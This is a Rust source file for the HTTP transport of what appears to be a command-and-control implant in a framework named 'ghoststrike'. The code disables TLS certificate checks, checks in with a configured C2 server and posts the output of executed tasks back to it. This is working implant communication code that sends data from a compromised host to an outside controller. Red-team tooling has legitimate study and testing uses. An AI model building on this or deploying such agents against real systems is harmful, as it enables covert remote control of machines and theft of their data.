use anyhow::Result;
use reqwest::Client;
use uuid::Uuid;

use ghoststrike_common::{
    AgentCheckinReq, AgentCheckinResp, ListenerProtocol, Task, TaskResultReq,
};
use crate::config::AgentConfig;

pub struct HttpTransport {
    client:   Client,
    base_url: String,
}

impl HttpTransport {
    pub fn new(cfg: &AgentConfig) -> Result<Self> {
        let scheme = match cfg.protocol {
            ListenerProtocol::Https => "https",
            _                       => "http",
        };
        let base_url = format!("{}://{}:{}", scheme, cfg.c2_host, cfg.c2_port);

        // Accept self-signed certs (the team server uses rcgen).
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .build()?;

        Ok(Self { client, base_url })
    }
}

#[async_trait::async_trait]
impl super::TransportInner for HttpTransport {
    async fn checkin(&self, req: &AgentCheckinReq) -> Result<AgentCheckinResp> {
        let resp = self
            .client
            .post(format!("{}/api/checkin", self.base_url))
            .json(req)
            .send()
            .await?
            .json::<AgentCheckinResp>()
            .await?;
        Ok(resp)
    }

    async fn report_task(&self, agent_id: Uuid, task: &Task, output: String) -> Result<()> {
        let req = TaskResultReq {
            task_id:  task.id,
            agent_id,
            output,
            success:  true,
        };
        self.client
            .post(format!("{}/api/taskresult", self.base_url))
            .json(&req)
            .send()
            .await?;
        Ok(())
    }
}
